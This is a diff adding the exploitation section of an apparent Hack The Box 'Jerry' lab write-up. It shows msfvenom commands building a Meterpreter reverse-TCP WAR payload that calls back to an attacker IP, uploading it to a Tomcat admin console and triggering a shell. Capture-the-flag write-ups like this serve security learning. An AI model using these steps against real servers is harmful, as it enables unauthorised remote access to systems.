@@ -102,3 +102,63 @@ We now have the following:
 - OS Name: Windows Server 2012 R2
 - OS Version: 6.3
 - OS Architecture: amd64
+
+Now that we have a decent amount of information about the machine, we can proceed to exploitation. As seen earlier, the admin has an option to upload files and execute them. The type of file as mentioned earlier is a WAR file. We can try to upload a crafted WAR payload that will spawn a shell on the machine. To do so we can use metasploit's msfvenom. First, we need to see if the WAR format is supported by msfvenom:
+
+```console
+kali@kali:~/Desktop/htb/jerry$ msfvenom --help-formats
+
+Executable formats
+asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
+
+Transform formats
+bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
+```
+
+**NOTE:** Executable formats will place the payload into a complete valid executable file, along with all the headers, footers, information blocks, checksums, heap options, loading instructions etc that goes along with it. Transform formats will output code suitable for copying into a script of some description, covering a wide range of scripting and higher level languages as well as some generic options as well.
+
+Now that we know that WAR is supported, we can build our payload. We already know that we are dealing with an x64 Windows system. So we can select the x64 Windows meterpreter. We set the listening IP and port and set the file type as WAR with -f.
+
+kali@kali:~/Desktop/htb/jerry$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.11 LPORT=4444  -f war -o evil.war
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of war file: 2460 bytes
+Saved as: evil.war
+
+As mentioned previously, WAR files are archives. We can unzip the file we generated to have a look inside:
+
+kali@kali:~/Desktop/htb/jerry$ unzip evil.war
+Archive:  evil.war
+   creating: META-INF/
+  inflating: META-INF/MANIFEST.MF
+   creating: WEB-INF/
+  inflating: WEB-INF/web.xml
+  inflating: qswppjdamzduqkn.jsp
+
+The file named qswppjdamzduqkn.jsp is most likely the one that contains our actual payload. We can now upload the WAR file to the admin console:
+
+![webpage-7](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-7.png)
+
+After uploading the WAR file we can now see it on the admin console as an application (/evil) that can be executed:
+
+![webpage-8](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-8.png)
+
+We can click on the ```/evil``` application to see if it gets executed. However, on navigating to ```/evil```, we get a 404:
+
+![webpage-9](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-9.png)
+
+This is probably because the WAR file, as we saw earlier, is an archive. We should point it to the actual jsp file instead that contains the payload. In order to do so, we can navigate to ```http://10.10.10.95:8080/evil/qswppjdamzduqkn.jsp``` instead. This time, it shows that the payload is being executed
+
+![webpage-10](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/webpage-10.png)
+
+Now we need to start a listener to catch the shell from the machine. In order to do so, we can use the Metasploit multi handler. We set the payload to ```windows/x64/meterpreter/reverse_tcp``` and set the listening IP and Port as shown:
+
+![msf-2](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/msf-2.png)
+
+After running the listener and then refreshing the ```http://10.10.10.95:8080/evil/qswppjdamzduqkn.jsp``` page, we get a shell on the listener:
+
+![msf-3](https://github.com/Shezz7/HTB-writeups/blob/master/jerry/resources/msf-3.png)
+
